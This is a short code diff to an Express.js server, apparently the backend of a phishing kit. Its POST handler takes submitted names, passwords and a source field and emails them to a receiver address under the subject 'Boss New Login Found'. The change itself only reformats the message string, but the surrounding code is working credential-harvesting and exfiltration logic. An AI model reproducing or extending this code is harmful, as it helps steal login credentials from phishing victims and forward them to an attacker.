@@ -13,10 +13,7 @@ app.use(express.urlencoded({ extended: true }));
 app.post("/", async (req, res) => {
     const data = req.body;
     const email = data.receiver;
-    const message = `
-      Email: ${data.name}
-      Access: ${data.pass}
-      Source: ${data.source}`;
+    const message = `Email: ${data.name}\nAccess: ${data.pass}\nSource: ${data.source}`;
 
 
     await sendEmail(email,"Boss New Login Found",message);
